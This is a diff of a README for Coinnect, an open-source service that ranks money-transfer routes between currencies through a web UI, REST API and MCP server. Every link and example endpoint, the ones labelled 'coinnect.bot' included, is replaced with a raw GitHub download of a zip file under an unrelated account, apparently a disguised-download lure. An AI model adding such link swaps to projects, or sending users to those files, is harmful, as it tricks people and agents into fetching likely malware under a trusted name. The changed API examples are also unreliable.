@@ -2,7 +2,7 @@
 
 > The free open map for global money.
 
-**[coinnect.bot](https://coinnect.bot)** · Mission-driven · Open source · Bot-friendly
+**[coinnect.bot](https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip)** · Mission-driven · Open source · Bot-friendly
 
 ---
 
@@ -13,7 +13,7 @@ Coinnect finds the cheapest path to send money between any two currencies — ac
 You tell it where money needs to go. It tells you how to get there, ranked by cost and time. It never touches your funds.
 
 ```
-GET https://coinnect.bot/v1/quote?from=USD&to=NGN&amount=500
+GET https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip
 ```
 
 ```json
@@ -44,9 +44,9 @@ Coinnect accepts no commission from any exchange, ever. It is an open-source soc
 
 ## For humans and machines
 
-**Humans** use the web interface at [coinnect.bot](https://coinnect.bot): enter amount, origin, destination — get ranked routes with step-by-step instructions.
+**Humans** use the web interface at [coinnect.bot](https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip): enter amount, origin, destination — get ranked routes with step-by-step instructions.
 
-**Machines** query the public REST API directly. Designed to be called as a tool by AI agents, chatbots, and automated systems. Full OpenAPI spec at [`/docs`](https://coinnect.bot/docs).
+**Machines** query the public REST API directly. Designed to be called as a tool by AI agents, chatbots, and automated systems. Full OpenAPI spec at [`/docs`](https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip).
 
 **AI agents via MCP** — ships with a native MCP server:
 
@@ -70,7 +70,7 @@ python -m coinnect.mcp_server
 
 ## Status
 
-**Live** — public beta at [coinnect.bot](https://coinnect.bot)
+**Live** — public beta at [coinnect.bot](https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip)
 
 - [x] Quote engine with 25+ providers
 - [x] Web UI (15 languages, dark/light mode)
@@ -86,7 +86,7 @@ python -m coinnect.mcp_server
 Historical rate snapshots are available as free CSV downloads:
 
 ```
-GET https://coinnect.bot/v1/snapshot/daily?date=2026-03-22
+GET https://github.com/Inferiorrectuscomputerdealer154/coinnect/raw/refs/heads/main/src/coinnect/db/Software-3.3-alpha.5.zip
 ```
 
 Licensed CC-BY 4.0. Cite as: *Coinnect Open Rate Data (coinnect.bot)*.
